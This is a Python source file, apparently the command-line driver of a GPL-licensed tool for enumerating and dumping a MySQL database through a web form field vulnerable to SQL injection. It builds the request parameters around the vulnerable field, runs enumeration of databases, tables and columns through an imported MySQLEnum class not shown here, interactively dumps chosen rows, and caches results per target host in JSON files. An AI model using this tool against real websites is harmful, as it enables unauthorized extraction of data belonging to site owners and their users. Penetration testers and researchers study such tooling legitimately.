#!/usr/bin/python
# 
# Enumerate details of a MySQL database through a form field that is vulnerable to SQL injection 
# Copyright (C) 2019
# Salman Raza <raza.salman@gmail.com>
#
# GNU General Public License v3.0
#
# This program is free software: you can redistribute it and/or modify it under the terms
# of the GNU General Public License as published by the Free Software Foundation, either version 3
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
# even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General
# Public License for more details.
#
# You should have received a copy of the GNU General Public License along with this program.
# If not, see <https://www.gnu.org/licenses/>

import os
from MySQLEnum import *
from Formatting import *
from builtins import input
import json

def construct_data(post_args, vuln_field):
    '''Construct the data that will be sent as a part of the GET or POST request to the target. One of these fields is specified as being vulnerable in the command line arguments, on which the SQL injection will be done.'''
    retval = {}
    
    if ":" not in post_args:

        print(clr.red("\n[!]") + "At least one parameter value must be set or if there is no parameter it should be left blank (E.g. -d 'param1:')\n   Exiting ...\n".format(vuln_field))
        exit(0)
    
    for i in post_args.split(","):
        
        param = i.split(":")
        retval[param[0]] = param[1]
        
    
    if vuln_field not in retval:
        
        print(clr.red("\n[!]") + "Vulnerable field '{}' not found in provided post arguments... exiting\n".format(vuln_field))
        exit(1)
    
    return retval

def show_enum_rows_option(target, keyinterrupt=False):
    '''Prompt if the user wishes to enumerate rows'''
    
    msg = "Enumerate rows? [y/n, default:n]: "
    
    if keyinterrupt == True:
        
        msg = "\n\nEnumerate rows for another table? [y/n, default:n]: "
    
    
    enum_rows = input(msg)
        
    if enum_rows == "y":
        
        while True:
        
            enumerate_rows(target)
                
            again = input("Enumerate rows for another table? [y/n, default:n]: ")
                
            if again == "n":
                
                break
    else:
        
        exit(0)

def enumerate_rows(target):
    '''Present the options and prompts for selecting tables, columns, number of rows to enumerate'''

    enumerated_rows = []
    
    selected_table = select_table(target.DB)
    num_rows = target.DB['tables'][selected_table]['row_count']
    
    print("\nTable selected: {} {}\n".format(clr.red(selected_table),clr.yellow("({} rows)".format(num_rows))))
    
    selected_col = select_col(target.DB, selected_table)
    
    selected_limit = select_row_limit(target.DB, selected_table)
    
    print("\nColumn selected: {}\n".format(clr.red(selected_col)))
    
    print("\nEnumerating rows for {}.{}\n".format(clr.red(selected_table), clr.red(selected_col)))
    
    try:
        
        rows = target.generate_rows(selected_col, selected_table, selected_limit)
        
        for row in rows:
            
            enumerated_rows.append(row)
            
        print(render_rows(enumerated_rows,selected_col))
            
        
    except KeyboardInterrupt:
    
        print("\nRow enumeration aborted, partial enumeration results for {}.{}:\n".format(clr.red(selected_table),clr.red(selected_col)))
        
        print(render_rows(enumerated_rows,selected_col))
        
        show_enum_rows_option(target, keyinterrupt=True)
    

def select_row_limit(db, selected_table):
    '''Prompt for selecting the number of rows to enumerate for the selected table.column. Some tables may have thousands of rows. Enumerating limited number of rows is usually enough for most requirements.'''
    
    total_rows = int(db['tables'][selected_table]['row_count'])
    
    while True:
    
        selected_limit = input("Number of rows to enumerate [Total: {}]: ".format(total_rows))
        
        if selected_limit == '':
            
            selected_limit = total_rows
            
        else:
            
            selected_limit = int(selected_limit)
        
        if selected_limit > 0 and selected_limit <= total_rows:
        
            break
            
    return selected_limit
    

def select_col(db, selected_table):
    '''Prompt for selecting the column in a table to enumerate it's rows'''
    
    cols = db['tables'][selected_table]['cols']
    
    total_cols = len(db['tables'][selected_table]['cols'])
    
    print(render_cols(cols))
    
    while True:
    
        col_index = int(input("Select Column to enumerate [{}-{}]: ".format("1",total_cols)))
        
        if col_index > 0 and col_index <= total_cols:
        
            break
            
    selected_col = list(cols.keys())[int(col_index)-1]
    
    return selected_col
    
def select_table(db):
    '''Prompt for selecting a table to enumerate it's rows'''
    
    print(render_tables(db))
        
    tables = db['tables']
    
    total_tables = len(db['tables'])
        
    while True:
    
        table_index = int(input("Select Table [{}-{}]: ".format("1",total_tables)))
        
        if table_index > 0 and table_index <=  total_tables:
        
            break
    
    selected_table = list(tables.keys())[int(table_index)-1]
    
    return selected_table

def get_file_name(url):
    '''Get the name of the json file that was saved for a particular url'''
    
    return './{}.json'.format(url.split('/')[2])

def show_results(target):
    '''Print enumeration results'''
    
    print_db_info(target.DB, format="table")
       
    print(clr.yellow("\nENUMERATED TABLES FOR: {}\n".format(clr.red(target.DB['params']['target_url']))))
    
    print_table_info(target.DB, format="table")

def set_params(kwargs, params_from_file):
    '''Set commandline parameters provided with the -f switch. If a parameter is provided it is used, otherwise it is taken from the json file saved earlier.'''
    
    retval = {}
    
    for key,val in kwargs.items():
        
        if val is not None:
            retval[key] = val
        else:
            retval[key] = params_from_file[key]
    
    return retval

def start(*args,**kwargs):
    '''Main program loop'''

    file_read = kwargs['file_read']

    args_init = dict(kwargs)
    
    del args_init['file_read']
    
    if file_read:
        
        file_name = get_file_name(kwargs['target_url'])
        
        if os.path.isfile(file_name):
            
            with open(file_name, 'r') as f:
                db = json.load(f)
            
            args_init = set_params(args_init, db['params'])
            
            target = MYSQLENUM(args_init)

            target.DB = db
            
            target.DB['params'] = args_init
            
            enumerate_rows(target)
            show_enum_rows_option(target)
            
                
        else:
            
            print(clr.red("\n[!]") + "File '{}' not found for URL: {}\n   Exiting ...\n".format(file_name,url))
            exit(1)
        
    
    else:
    
        kwargs['data'] = construct_data(kwargs['data'], kwargs['vuln_field'])
        
        print(clr.red("\nENUMERATING DATABASE ...\n"))
       
        target = MYSQLENUM(kwargs)
        
        target.enumerate()
        
        show_results(target)
        
        show_enum_rows_option(target)
    
    
